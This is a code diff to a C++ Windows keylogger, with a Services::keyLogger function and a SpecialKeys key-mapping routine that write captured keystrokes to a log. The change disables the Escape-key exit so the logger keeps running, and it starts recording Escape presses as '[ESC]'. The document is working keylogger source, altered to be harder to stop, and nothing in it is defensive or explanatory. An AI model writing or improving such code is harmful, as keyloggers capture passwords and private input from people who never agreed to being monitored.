@@ -27,9 +27,9 @@ bool Services::keyLogger(const std::string &saveFile) {
                 logData.clear();  
             }  
         }  
-        if (GetAsyncKeyState(VK_ESCAPE)) {  
-            break;
-        } 
+        // if (GetAsyncKeyState(VK_ESCAPE)) {  
+        //     break;
+        // } 
         while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {  
             TranslateMessage(&msg);  
             DispatchMessage(&msg);  
@@ -96,9 +96,9 @@ bool SpecialKeys(int S_Key) {
     case VK_RMENU:
         logData += "[ALT]";
         return true;
-    // case VK_ESCAPE:
-    //     logData += "[ESC]";
-    //     return true;
+    case VK_ESCAPE:
+        logData += "[ESC]";
+        return true;
     case VK_HOME:
         logData += "[HOME]";
         return true;
